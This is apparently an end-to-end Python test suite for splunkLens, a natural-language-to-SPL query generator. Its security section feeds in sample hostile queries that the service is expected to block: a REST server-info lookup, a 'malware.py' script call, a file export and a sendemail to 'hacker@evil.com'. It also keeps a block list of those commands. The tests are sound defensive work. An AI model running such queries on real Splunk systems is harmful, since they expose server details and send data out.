#!/usr/bin/env python3
"""
End-to-end tests for splunkLens application
Tests both backend API and frontend functionality
"""

import requests
import json
import time
import subprocess
import sys
from typing import Dict, Any

class SplunkLensE2ETest:
    def __init__(self, backend_url: str = "http://localhost:8001", frontend_url: str = "http://localhost:3000"):
        self.backend_url = backend_url
        self.frontend_url = frontend_url
        self.session = requests.Session()
        self.test_results = []
    
    def log_test(self, test_name: str, success: bool, details: str = ""):
        """Log test results"""
        status = "✅ PASS" if success else "❌ FAIL"
        print(f"{status} {test_name}")
        if details:
            print(f"   Details: {details}")
        
        self.test_results.append({
            "test": test_name,
            "success": success,
            "details": details,
            "timestamp": time.time()
        })
    
    def test_backend_health(self):
        """Test backend health and basic functionality"""
        try:
            response = self.session.get(f"{self.backend_url}/")
            success = response.status_code == 200
            self.log_test("Backend Health", success, f"Status: {response.status_code}")
            return success
        except Exception as e:
            self.log_test("Backend Health", False, f"Error: {e}")
            return False
    
    def test_frontend_accessibility(self):
        """Test frontend accessibility"""
        try:
            response = self.session.get(self.frontend_url)
            success = response.status_code == 200 and "splunkLens" in response.text
            self.log_test("Frontend Accessibility", success, f"Status: {response.status_code}")
            return success
        except Exception as e:
            self.log_test("Frontend Accessibility", False, f"Error: {e}")
            return False
    
    def test_api_endpoints(self):
        """Test all API endpoints comprehensively"""
        endpoints_tests = [
            {
                "name": "API Documentation",
                "method": "GET",
                "url": f"{self.backend_url}/docs",
                "expected_status": 200
            },
            {
                "name": "OpenAPI Schema",
                "method": "GET",
                "url": f"{self.backend_url}/openapi.json",
                "expected_status": 200
            }
        ]
        
        passed = 0
        for test in endpoints_tests:
            try:
                if test["method"] == "GET":
                    response = self.session.get(test["url"])
                else:
                    response = self.session.post(test["url"], json={})
                
                success = response.status_code == test["expected_status"]
                self.log_test(test["name"], success, f"Status: {response.status_code}")
                if success:
                    passed += 1
            except Exception as e:
                self.log_test(test["name"], False, f"Error: {e}")
        
        return passed == len(endpoints_tests)
    
    def test_spl_generation_scenarios(self):
        """Test various SPL generation scenarios"""
        test_scenarios = [
            {
                "name": "Simple Error Search",
                "query": "Show me all errors from today",
                "expected_keywords": ["search", "error"]
            },
            {
                "name": "Authentication Failures",
                "query": "Count authentication failures by user",
                "expected_keywords": ["stats", "count", "by", "user"]
            },
            {
                "name": "Traffic Analysis",
                "query": "Show top 10 source IPs by traffic volume",
                "expected_keywords": ["stats", "src_ip"]
            },
            {
                "name": "Time Series Analysis",
                "query": "Display response times over time",
                "expected_keywords": ["timechart", "response_time"]
            },
            {
                "name": "Data Table",
                "query": "Show me a table of recent events",
                "expected_keywords": ["table", "_time"]
            }
        ]
        
        passed = 0
        for scenario in test_scenarios:
            try:
                payload = {
                    "query": scenario["query"],
                    "index": "main",
                    "lookback_days": 1
                }
                
                response = self.session.post(f"{self.backend_url}/generate-spl", json=payload)
                
                if response.status_code == 200:
                    data = response.json()
                    spl = data.get("spl", "").lower()
                    
                    # Check for expected keywords
                    keywords_found = sum(1 for keyword in scenario["expected_keywords"] if keyword in spl)
                    keyword_ratio = keywords_found / len(scenario["expected_keywords"])
                    
                    success = keyword_ratio >= 0.5  # At least 50% of keywords found
                    self.log_test(
                        scenario["name"], 
                        success, 
                        f"Keywords: {keywords_found}/{len(scenario['expected_keywords'])}, SPL: {spl[:50]}..."
                    )
                    
                    if success:
                        passed += 1
                else:
                    self.log_test(scenario["name"], False, f"HTTP {response.status_code}")
                    
            except Exception as e:
                self.log_test(scenario["name"], False, f"Error: {e}")
        
        overall_success = passed >= len(test_scenarios) * 0.8  # 80% success rate
        self.log_test("SPL Generation Scenarios", overall_success, f"{passed}/{len(test_scenarios)} scenarios passed")
        return overall_success
    
    def test_security_features(self):
        """Test security validation and blocking"""
        security_tests = [
            {
                "name": "REST Command Block",
                "query": "| rest /services/server/info",
                "should_block": True
            },
            {
                "name": "Script Command Block",
                "query": "search index=main | script python malware.py",
                "should_block": True
            },
            {
                "name": "File Output Block",
                "query": "search index=main | outputcsv /tmp/data.csv",
                "should_block": True
            },
            {
                "name": "Email Command Block",
                "query": "search index=main | sendemail to=hacker@evil.com",
                "should_block": True
            },
            {
                "name": "Safe Query Allow",
                "query": "search index=main error | stats count by host",
                "should_block": False
            }
        ]
        
        passed = 0
        for test in security_tests:
            try:
                payload = {
                    "query": test["query"],
                    "index": "main",
                    "lookback_days": 1
                }
                
                response = self.session.post(f"{self.backend_url}/generate-spl", json=payload)
                
                if test["should_block"]:
                    # Should be blocked (400 error) or generate safe SPL
                    blocked = (response.status_code == 400 or 
                             (response.status_code == 200 and 
                              not any(cmd in response.json().get("spl", "") for cmd in ["rest", "script", "outputcsv", "sendemail"])))
                    
                    self.log_test(test["name"], blocked, "Properly blocked" if blocked else "Not blocked")
                    if blocked:
                        passed += 1
                else:
                    # Should be allowed
                    allowed = response.status_code == 200
                    self.log_test(test["name"], allowed, "Properly allowed" if allowed else "Incorrectly blocked")
                    if allowed:
                        passed += 1
                        
            except Exception as e:
                self.log_test(test["name"], False, f"Error: {e}")
        
        overall_success = passed == len(security_tests)
        self.log_test("Security Features", overall_success, f"{passed}/{len(security_tests)} security tests passed")
        return overall_success
    
    def test_performance_benchmarks(self):
        """Test performance benchmarks"""
        performance_tests = [
            {
                "name": "Single Query Performance",
                "iterations": 1,
                "max_time_ms": 2000
            },
            {
                "name": "Multiple Queries Performance",
                "iterations": 5,
                "max_time_ms": 10000
            }
        ]
        
        passed = 0
        for test in performance_tests:
            try:
                payload = {
                    "query": "Show me errors from the last hour",
                    "index": "main",
                    "lookback_days": 1
                }
                
                start_time = time.time()
                
                for i in range(test["iterations"]):
                    response = self.session.post(f"{self.backend_url}/generate-spl", json=payload)
                    if response.status_code != 200:
                        break
                
                end_time = time.time()
                total_time_ms = (end_time - start_time) * 1000
                avg_time_ms = total_time_ms / test["iterations"]
                
                success = total_time_ms <= test["max_time_ms"] and response.status_code == 200
                self.log_test(
                    test["name"], 
                    success, 
                    f"Total: {total_time_ms:.2f}ms, Avg: {avg_time_ms:.2f}ms"
                )
                
                if success:
                    passed += 1
                    
            except Exception as e:
                self.log_test(test["name"], False, f"Error: {e}")
        
        overall_success = passed >= len(performance_tests) // 2
        self.log_test("Performance Benchmarks", overall_success, f"{passed}/{len(performance_tests)} performance tests passed")
        return overall_success
    
    def test_error_handling(self):
        """Test error handling and edge cases"""
        error_tests = [
            {
                "name": "Empty Query",
                "payload": {"query": ""},
                "expected_status": 422
            },
            {
                "name": "Invalid Lookback",
                "payload": {"query": "test", "lookback_days": -1},
                "expected_status": 422
            },
            {
                "name": "Extremely Long Query",
                "payload": {"query": "a" * 2000},
                "expected_status": 422
            },
            {
                "name": "Missing Required Fields",
                "payload": {},
                "expected_status": 422
            }
        ]
        
        passed = 0
        for test in error_tests:
            try:
                response = self.session.post(f"{self.backend_url}/generate-spl", json=test["payload"])
                success = response.status_code == test["expected_status"]
                self.log_test(test["name"], success, f"Status: {response.status_code}")
                if success:
                    passed += 1
            except Exception as e:
                self.log_test(test["name"], False, f"Error: {e}")
        
        overall_success = passed >= len(error_tests) * 0.75  # 75% success rate
        self.log_test("Error Handling", overall_success, f"{passed}/{len(error_tests)} error tests passed")
        return overall_success
    
    def run_comprehensive_tests(self):
        """Run all comprehensive tests"""
        print("🚀 Starting splunkLens Comprehensive E2E Tests\n")
        
        tests = [
            ("Backend Health Check", self.test_backend_health),
            ("Frontend Accessibility", self.test_frontend_accessibility),
            ("API Endpoints", self.test_api_endpoints),
            ("SPL Generation Scenarios", self.test_spl_generation_scenarios),
            ("Security Features", self.test_security_features),
            ("Performance Benchmarks", self.test_performance_benchmarks),
            ("Error Handling", self.test_error_handling)
        ]
        
        passed = 0
        total = len(tests)
        
        for test_name, test_func in tests:
            print(f"\n🔍 Running {test_name}...")
            if test_func():
                passed += 1
            print()  # Empty line between test groups
        
        print(f"\n📊 Final Test Results: {passed}/{total} test groups passed")
        
        if passed == total:
            print("🎉 All tests passed! splunkLens is fully functional and production-ready.")
            grade = "A+"
        elif passed >= total * 0.9:
            print("🌟 Excellent! Almost all tests passed. Application is highly functional.")
            grade = "A"
        elif passed >= total * 0.8:
            print("✅ Good! Most tests passed. Application is functional with minor issues.")
            grade = "B+"
        elif passed >= total * 0.7:
            print("👍 Acceptable. Application works but has some issues to address.")
            grade = "B"
        elif passed >= total * 0.5:
            print("⚠️  Needs improvement. Application has significant issues.")
            grade = "C"
        else:
            print("❌ Major issues detected. Application needs substantial fixes.")
            grade = "F"
        
        print(f"\n🎯 Overall Grade: {grade}")
        
        return passed, total, grade
    
    def generate_comprehensive_report(self):
        """Generate a comprehensive test report"""
        passed_tests = sum(1 for result in self.test_results if result["success"])
        total_tests = len(self.test_results)
        
        report = {
            "timestamp": time.time(),
            "test_summary": {
                "total_tests": total_tests,
                "passed_tests": passed_tests,
                "failed_tests": total_tests - passed_tests,
                "success_rate": round((passed_tests / total_tests) * 100, 2) if total_tests > 0 else 0
            },
            "test_details": self.test_results,
            "recommendations": self._generate_recommendations()
        }
        
        with open("comprehensive_test_report.json", "w") as f:
            json.dump(report, f, indent=2)
        
        print(f"\n📄 Comprehensive test report saved to: comprehensive_test_report.json")
        return report
    
    def _generate_recommendations(self):
        """Generate recommendations based on test results"""
        failed_tests = [result for result in self.test_results if not result["success"]]
        
        recommendations = []
        
        if any("Performance" in test["test"] for test in failed_tests):
            recommendations.append("Consider optimizing API response times and implementing caching")
        
        if any("Security" in test["test"] for test in failed_tests):
            recommendations.append("Review and strengthen security validation rules")
        
        if any("Frontend" in test["test"] for test in failed_tests):
            recommendations.append("Check frontend deployment and accessibility")
        
        if any("Error" in test["test"] for test in failed_tests):
            recommendations.append("Improve error handling and input validation")
        
        if not recommendations:
            recommendations.append("Excellent work! All major functionality is working correctly.")
        
        return recommendations

if __name__ == "__main__":
    # Run comprehensive E2E tests
    tester = SplunkLensE2ETest()
    
    try:
        passed, total, grade = tester.run_comprehensive_tests()
        report = tester.generate_comprehensive_report()
        
        # Exit with appropriate code
        exit(0 if passed >= total * 0.8 else 1)  # 80% pass rate required
        
    except KeyboardInterrupt:
        print("\n⏹️  Tests interrupted by user")
        exit(1)
    except Exception as e:
        print(f"\n💥 Test runner error: {e}")
        exit(1)